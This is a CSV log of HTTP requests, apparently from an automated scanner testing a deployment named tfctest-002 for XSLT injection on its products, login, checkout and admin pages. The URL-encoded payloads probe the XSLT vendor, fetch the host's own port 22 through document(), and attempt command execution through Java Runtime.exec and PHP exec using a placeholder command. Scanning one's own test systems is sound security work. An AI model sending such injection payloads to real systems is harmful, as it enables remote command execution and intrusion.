ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5660,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,521,429,1100
5661,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,540,429,1100
5662,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,515,429,1101
5663,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,663,429,1036
5664,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,515,429,1033
5665,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,486,428,624
5666,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,531,428,282
5667,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,518,429,1100
5668,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,881,429,1033
5669,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,544,429,1100
5670,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,531,429,1101
5671,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,517,429,1033
5672,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,653,429,1036
5673,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,522,428,282
5674,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,522,428,373
5675,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,512,429,1100
5676,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,550,429,1100
5677,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,513,429,1101
5678,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,869,429,1033
5679,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3C,200,OK,534,429,1100
5680,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3C,200,OK,534,429,1100
5681,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3C,200,OK,534,429,1100
5682,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3C,200,OK,534,429,1102
5683,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,552,429,1100
5684,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3C,200,OK,519,429,1100
5685,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3C,200,OK,514,429,1100
5686,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,497,429,1100
5687,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,520,429,1100
5688,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,504,429,1102
5689,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,504,429,1100
5690,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3C,200,OK,514,429,1100
5691,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,530,429,1100
5692,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,879,429,1033
5693,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,532,429,1100
5694,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,516,429,1100
5695,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1102
5696,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,533,429,1100
5697,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1100
5698,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,536,429,1100
5699,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,521,429,1100
5700,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3C,200,OK,507,429,1100
5701,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,524,429,1100
5702,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,520,429,1100
5703,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,502,429,1102
5704,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,533,429,1100
5705,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,550,429,1100
5706,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1100
5707,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,533,429,1100
5708,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,502,429,1100
5709,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1100
5710,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,484,429,1100
5711,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,535,429,1100
5712,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,535,429,1102
5713,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,503,429,1100
5714,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,566,429,1100
5715,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,550,429,1100
5716,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,532,429,1100
5717,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,542,429,1100
5718,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,492,429,1100
5719,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,492,429,1102
5720,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,522,429,1100
5721,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1100
5722,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,513,429,1100
5723,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,526,429,1100
5724,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,1051,429,1100
5725,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,509,429,1100
5726,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,509,429,1100
5727,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,525,429,1100
5728,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,525,429,1102
5729,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,518,429,1100
5730,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,523,429,1100
5731,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,570,429,1100
5732,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,529,429,1100
5733,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,538,429,1100
5734,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,503,429,1100
5735,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,502,429,1100
5736,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,518,429,1102
5737,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,524,429,1100
5738,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,508,429,1100
5739,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,541,429,1100
5740,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,523,429,1100
